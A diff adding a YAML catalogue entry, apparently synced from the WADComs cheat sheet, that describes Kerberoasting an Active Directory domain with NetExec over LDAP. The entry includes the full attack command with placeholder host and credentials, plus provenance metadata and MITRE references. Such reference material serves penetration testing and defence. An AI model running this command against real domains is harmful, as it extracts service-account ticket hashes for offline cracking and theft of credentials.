@@ -1,0 +1,103 @@
+id: wadcoms/NetExec-LDAP-Kerberoasting
+type: technique
+platform: active-directory
+name: NetExec LDAP Kerberoasting
+phases:
+- credential-access
+capabilities:
+- credential-access
+- kerberoast
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid username
+- a valid password
+- an NTLM hash (pass-the-hash)
+commands:
+- template: nxc ldap 10.10.10.1 -u 'john' -p 'password123' --kerberoasting output.txt
+  comment: "NetExec (formerly CrackMapExec) performs a Kerberoasting attack via the LDAP service.\nThis\
+    \ command authenticates with the given domain account, enumerates Service Principal Name (SPN) accounts,\
+    \ \nand extracts their Kerberos ticket hashes, saving them into the specified file.\nThe obtained\
+    \ hashes can later be cracked offline using brute force or wordlists.\n\nCommand Reference:\n\n\t\
+    Target IP: 10.10.10.1\n\tDomain: test.local\n\tUsername: john\n\tPassword: password123\n\tOutput File:\
+    \ output.txt\n"
+references:
+- https://github.com/Pennyw0rth/NetExec
+- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
+- https://attack.mitre.org/techniques/T1558/003/
+tags:
+- active-directory
+- wadcoms
+- ldap
+source_data:
+  WADComs:
+    raw:
+      file: NetExec-LDAP-Kerberoasting.md
+      document: "---\ndescription: |\n  NetExec (formerly CrackMapExec) performs a Kerberoasting attack\
+        \ via the LDAP service.\n  This command authenticates with the given domain account, enumerates\
+        \ Service Principal Name (SPN) accounts, \n  and extracts their Kerberos ticket hashes, saving\
+        \ them into the specified file.\n  The obtained hashes can later be cracked offline using brute\
+        \ force or wordlists.\n\n  Command Reference:\n\n  \tTarget IP: 10.10.10.1\n  \tDomain: test.local\n\
+        \  \tUsername: john\n  \tPassword: password123\n  \tOutput File: output.txt\n\ncommand: |\n  nxc\
+        \ ldap 10.10.10.1 -u 'john' -p 'password123' --kerberoasting output.txt\nitems:\n  - Username\n\
+        \  - Password\n  - Hash\nservices:\n  - LDAP\nOS:\n  - Linux\n  - Windows\nattack_types:\n  -\
+        \ Credential Access\n  - Kerberoasting\nreferences:\n  - https://github.com/Pennyw0rth/NetExec\n\
+        \  - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast\n \
+        \ - https://attack.mitre.org/techniques/T1558/003/\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: credential-access
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Credential Access'
+    confidence:
+      level: high
+  - value: kerberoast
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Kerberoasting'
+    confidence:
+      level: high
+  phases:
+  - value: credential-access
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Credential Access'
+    confidence:
+      level: high
+  - value: credential-access
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Kerberoasting'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:94b0ac0fd0bcca9de5548aee58b56abb70c1e2b43f109975cc9e8569951ffc4c
